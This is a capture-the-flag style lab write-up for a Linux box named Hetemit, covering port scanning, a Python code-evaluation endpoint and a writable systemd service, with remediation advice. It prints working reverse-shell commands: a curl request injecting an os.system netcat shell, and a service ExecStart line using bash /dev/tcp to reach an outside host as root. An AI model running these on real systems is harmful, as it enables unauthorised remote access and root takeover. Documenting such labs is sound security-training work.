---
Alias: Hetemit
Date: 7/18/2022
Platform: Linux
Difficulty: Intermediate
Tags: #os.systemCommandExecution #sudo/sbin/reboot
Status: Finished
IP: 192.168.56.117
---

# {{Hetemit}}


# Resolution summary
- Found an application that performs evaluation on port 50000
- Entered curl -X post --data "code=os" to verify that the application was operating in Python, as indicated by nmap.
- After executing an os.system netcat command using curl, a reverse shell was obtained.
- Found a pythonapp.service could be written by our user.
- Changed the PythonApp.service to launch a reverse shell with root privileges.
- After restarting the service, a root shell was returned. 

## Improved skills
- Learned curl -X POST --data option "code= " option
- os.system commands

## Used tools
- nmap
- rustscan

### **Vulnerability Explanation:** 
### Initial Access
## os.system Command Injection

### Description:

The command injection vulnerability associated with the `os.system` function in various programming languages (commonly Python) arises when this function is used to execute operating system commands with inputs taken from user input or other untrusted sources without proper sanitization. This function directly passes the command to the underlying operating system shell. If the user input is not properly sanitized, an attacker can inject and execute arbitrary commands on the host operating system with the privileges of the process running the script.

### Impact:

An attacker can leverage this vulnerability to execute arbitrary commands on the server, which may lead to unauthorized access to the system's data, alteration of system configurations, launching of further attacks, or taking control of the system to perform malicious activities. The impact level is particularly high if the application runs with elevated privileges.

### **Vulnerability Fix:**
### Initial Access
## os.system Command Injection

1. Input Validation and Sanitization:
    - Implement strict input validation and data sanitization techniques to prevent command injection vulnerabilities.
    - Use secure coding practices and frameworks (e.g., OWASP recommendations) to sanitize user inputs before passing them to system commands.
2. Use Subprocess Module:
    - Avoid using os.system for executing system commands and instead use the subprocess module with proper argument handling and escaping.
3. Principle of Least Privilege:
    - Limit the privileges of the application or user executing system commands to minimize the impact of potential command injection attacks.
4. Regular Security Audits:
    - Conduct regular security audits and code reviews to identify and remediate vulnerabilities, including command injection risks.
5. Security Awareness:
    - Educate developers and system administrators about the risks associated with command injection vulnerabilities and best practices for secure coding.

### **Vulnerability Explanation:** 
#### Privilege Escalation
##### Writable pythonapp.service

- Observed that the pythonapp.service file has incorrect permissions, allowing unauthorized users to modify its contents.

- Successfully exploited the vulnerability to inject malicious commands into the service file and execute unauthorized actions.

- Demonstrated the potential impact of the vulnerability, highlighting the risk of unauthorized code execution and service disruption.


### **Vulnerability Fix:**

#### Privilege Escalation
##### Writable pythonapp.service

1. Correct Permissions:
    - Change the permissions of pythonapp.service to restrict write access to authorized users only (e.g., root).
    - Set permissions to 644 (-rw-r--r--) to allow read access for everyone and write access only for the file owner.
2. Access Control:
    - Restrict access to directories containing systemd service files (/etc/systemd/system/, /lib/systemd/system/) to prevent unauthorized modifications.
3. Regular Audits:
    - Implement regular audits of system configurations and file permissions to detect and mitigate similar vulnerabilities proactively.
4. Security Awareness:
    - Educate system administrators and developers about secure file permissions and the potential risks associated with writable service files.


---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan --addresses 192.168.127.117 --ulimit 5000 -- -A -sC -Pn -sV -T 1500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/brian/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.127.117:21
Open 192.168.127.117:22
Open 192.168.127.117:80
Open 192.168.127.117:139
Open 192.168.127.117:445
Open 192.168.127.117:18000
Open 192.168.127.117:50000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -Pn -sV -T 1500" on ip 192.168.127.117
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-16 11:49 PDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:49
Completed NSE at 11:49, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:49
Completed Parallel DNS resolution of 1 host. at 11:49, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:49
Scanning 192.168.127.117 [7 ports]
Discovered open port 22/tcp on 192.168.127.117
Discovered open port 139/tcp on 192.168.127.117
Connect Scan Timing: About 35.71% done; ETC: 11:51 (0:01:21 remaining)
Discovered open port 445/tcp on 192.168.127.117
Discovered open port 80/tcp on 192.168.127.117
Connect Scan Timing: About 64.29% done; ETC: 11:51 (0:00:42 remaining)
Discovered open port 21/tcp on 192.168.127.117
Discovered open port 50000/tcp on 192.168.127.117
Discovered open port 18000/tcp on 192.168.127.117
Completed Connect Scan at 11:51, 108.01s elapsed (7 total ports)
Initiating Service scan at 11:51
Scanning 7 services on 192.168.127.117
Completed Service scan at 11:51, 41.02s elapsed (7 services on 1 host)
NSE: Script scanning 192.168.127.117.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:51
NSE: [ftp-bounce 192.168.127.117:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 95.63% done; ETC: 11:52 (0:00:01 remaining)
NSE Timing: About 98.44% done; ETC: 11:52 (0:00:01 remaining)
Completed NSE at 11:53, 74.77s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 3.62s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Nmap scan report for 192.168.127.117
Host is up, received user-set (0.18s latency).
Scanned at 2022-10-16 11:49:35 PDT for 212s

PORT      STATE SERVICE     REASON  VERSION
21/tcp    open  ftp         syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.49.127
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         syn-ack OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH2Cap49zuKy70lHzXsOn9iOap0h1Dnwk14D6PNKugueOqGpYoffwCGCA0wF4cI3+MRjuHz4xGznmtTIP3vOBZINZvT5PsNcvu6ef0SDfDOMFbzsEirhpQuoBYvgmEuJ4u1VMiwNaYQ0jw9t+nsR2MAIym/wdKt+ghYm4qlB3WvLMV41uCu0F7OQadRX8GWrLWLucjSQ1f80tkV7mc7ZfuTm8YdsAOkNQufHkVE+Alk0NpHdqLh/6FHxmEqYwP0jX6HS/lg+MfczIbIQ91v7+ljvo3qgdSZPqqulUtQuj/Rb/gmIfItzFZIxTzLQ6FuKKmoTMXaR/tXf93+91z+kBdDaZe/5eu6fLCdGuFyioB97LdZGJq8uFbM0BpNeBYc0i/DOFwxWBhO8/zzv1uaTUKuS1B+bny1iUTiQoJj6GVRQmvgk/2Km5SanF3Cp4PSSJMQ112Umjg1T61ah/i//KXAyZ25xOznolBw/aoCc9cremrkycUp7dmuATBNCgHFS0=
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPTMpDGmoKZ96W+Ivvw7sQmnD1U41OY34oAzJ5Z1/AP/iVj+TpKO6lCKPxDq+9nbJJU4dtQx8X+KjQqUtpYIUhw=
|   256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEUnTSrfkvL2AJJsozjPtXIWf/6Z7UB9WptTiOOX93m4
80/tcp    open  http        syn-ack Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
139/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.6.2
18000/tcp open  biimenu?    syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
50000/tcp open  http        syn-ack Werkzeug httpd 1.0.1 (Python 3.6.8)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port18000-TCP:V=7.92%I=7%D=10/16%Time=634C52BA%P=aarch64-unknown-linux-
SF:gnu%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(G
SF:etRequest,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/h
SF:tml;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20ht
SF:ml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\
SF:x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</tit
SF:le>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x
SF:20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333
SF:;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x
SF:20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x2
SF:0font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\
SF:x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x2
SF:0line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n
SF:\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20wh
SF:ite-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\
SF:x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x2
SF:0\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x20
SF:0px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x
SF:20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n
SF:\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x
SF:20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h
SF:1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x
SF:20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x
SF:202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\
SF:x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px
SF:;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x2
SF:0\x20\x20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nCon
SF:tent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\
SF:n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x
SF:20charset=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exce
SF:ption\x20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x
SF:20\x20\x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x
SF:20\x20color:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x2
SF:0\x20\x20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x2
SF:0\x20\x20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x2
SF:0\x20\x20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x
SF:20\x20\x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x
SF:20\x20\x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\
SF:x20\x20\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20sol
SF:id\x20#EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x2
SF:0\x20\x20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x2
SF:0\x20\x20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x
SF:20\x20\x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\
SF:n\n\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x
SF:200;\n\x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20
SF:\x20\x20font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20
SF:{\n\x20\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20
SF:line-height:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x
SF:20{\n\x20\x20\x20\x20\x20\x20bord");
Service Info: OS: Unix

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62974/tcp): CLEAN (Timeout)
|   Check 2 (port 56787/tcp): CLEAN (Timeout)
|   Check 3 (port 9774/udp): CLEAN (Timeout)
|   Check 4 (port 48068/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2022-10-16T18:52:40
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:53
Completed NSE at 11:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 227.76 seconds

```

Enumerated open TCP ports:
```bash
50000
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 50000 Werkzeug httpd 1.0.1

- We access http://192.168.56.117:50000 based on the results of the Nmap scan, and the following webpage appears:
  
![](Images/Pasted%20image%2020221016140831.png)

- As the webpage includes a "/verify" directory, we visit http://192.168.56.117:50000/verify.
  
![](Images/Pasted%20image%2020221016152718.png)

- We type the following command and the output indicates the application performs evaluation.

curl –X post –-data "code=2*2" http://192.168.56.117:50000/verify

![](Images/Pasted%20image%2020221016152913.png)

---

# Exploitation
## os.system  Command Execution

To exploit the application, the os.system command execution method was used. Since port 50000 was found to be running Python 3.6 from the NMAP output, the command os.system was tested to confirm Python 3.6 presence.

![](Images/Pasted%20image%2020221016153044.png)

- We start a penelope listener on port 18000

- A reverse shell was returned from the penelope listener that was running on port 18000 when we typed the following command.

curl -X POST --data "code=os.system('nc -e /bin/bash 192.168.45.161 18000')" http://192.168.229.117:50000/verify

![](Images/Pasted%20image%2020221016195553.png)
#os.systemCommandExecution

![](Images/Pasted%20image%2020221016155012.png)

---

# Privilege Escalation
## Local Enumeration

- Entering "sudo –l" shows our user can run /sbin/halt, /sbin/reboot and /sbin/poweroff as root:
      
![[Pasted image 20240418155259.png]]

- We discover that we can write to "/etc/systemd/system/pythonapp.service" according to the linpeas.sh script output.
  
![](Images/Pasted%20image%2020221016173419.png)

## Privilege Escalation vector
## Modifiable pythonapp.service

- We type "cat /etc/systemd/system/pythonapp.service" which shows the following.

![image](https://github.com/Bsal13/Offensive-Security-Proving-Grounds-Boxes/assets/90739944/84929ecd-d675-4284-a8ac-933993b5d646)

- We type "vi /etc/systemd/system/pythonapp.service"

- We make the following modifications.

ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.161/50000 0>&1'
User=root
  
/home/parallels/Documents/Offensive-Security-Proving-Grounds-Boxes-Sync/Pasted Images/Pasted image 20240418181341.png

- We type "sudo /sbin/reboot" to reboot the system since "services" need to be restarted in order for any modifications we made to the service app to take effect.

- Next, we obtain a root shell after setting up a listener on port 50000.

/home/parallels/Documents/Offensive-Security-Proving-Grounds-Boxes-Sync/Pasted Images/Pasted image 20240418182524.png

---

